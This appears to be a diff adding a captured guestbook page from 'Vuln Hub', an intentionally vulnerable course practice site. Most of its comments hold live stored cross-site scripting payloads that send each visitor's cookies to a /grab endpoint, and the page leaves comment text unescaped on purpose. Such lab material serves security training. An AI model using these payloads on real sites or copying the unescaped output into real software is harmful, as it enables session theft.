@@ -1,0 +1,77 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Vuln Hub — INF601 Practice Target</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+  <header>
+    <a href="/" class="brand">Vuln Hub</a>
+    <nav>
+      <a href="/">Home</a>
+      <a href="/login">Login</a>
+      <a href="/messages">Messages</a>
+      <a href="/guestbook">Guestbook</a>
+      <a href="/download?file=welcome.txt">Downloads</a>
+      
+    </nav>
+  </header>
+  
+  <main>
+    
+<h1>Guestbook</h1>
+<p class="hint">Comments are displayed to everyone who visits — including the site admin.</p>
+<form method="post">
+  <label>Leave a comment<br>
+    <textarea name="comment" rows="3" cols="50"></textarea>
+  </label>
+  <button type="submit">Post</button>
+</form>
+<hr>
+<div class="comments">
+  
+    <div class="comment">
+      <span class="author">admin</span>:
+      
+      <span class="text">Welcome to the guestbook!</span>
+    </div>
+  
+    <div class="comment">
+      <span class="author">alice</span>:
+      
+      <span class="text"><script>fetch('/grab?c='+document.cookie)</script></span>
+    </div>
+  
+    <div class="comment">
+      <span class="author">admin</span>:
+      
+      <span class="text"><script>fetch('/grab?cookie='+document.cookie)</script></span>
+    </div>
+  
+    <div class="comment">
+      <span class="author">admin</span>:
+      
+      <span class="text"><script>fetch('/grab?c='+document.cookie)</script></span>
+    </div>
+  
+    <div class="comment">
+      <span class="author">anonymous</span>:
+      
+      <span class="text"><script>fetch('/grab?c='+document.cookie)</script></span>
+    </div>
+  
+    <div class="comment">
+      <span class="author">alice</span>:
+      
+      <span class="text"><script>fetch('/grab?run2='+document.cookie)</script></span>
+    </div>
+  
+</div>
+
+  </main>
+  <footer>
+    <p>⚠️ Intentionally vulnerable practice target — run locally only. Not for production use.</p>
+  </footer>
+</body>
+</html>
